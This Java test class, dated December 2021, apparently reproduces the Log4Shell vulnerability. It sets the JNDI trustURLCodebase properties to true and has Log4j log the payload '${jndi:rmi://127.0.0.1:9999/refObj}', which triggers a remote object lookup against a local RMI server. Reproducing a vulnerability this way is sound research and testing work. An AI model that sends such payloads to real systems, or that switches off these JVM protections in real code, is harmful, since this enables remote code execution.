package security;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

/**
 * @Title: LogTest
 * @Description:
 * @author: LiuYang
 * @date: 2021/12/10 3:46 下午
 */
public class LogTest {

    private static final Logger LOGGER = LogManager.getLogger(LogTest.class);

    public static void main(String[] args) throws RemoteException, NotBoundException, NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        Context ctx = new InitialContext();
//        ctx.lookup("rmi://localhost:9999/refObj");
        String param = "${jndi:rmi://127.0.0.1:9999/refObj}";
        LOGGER.error("test attack {}", param);
    }
}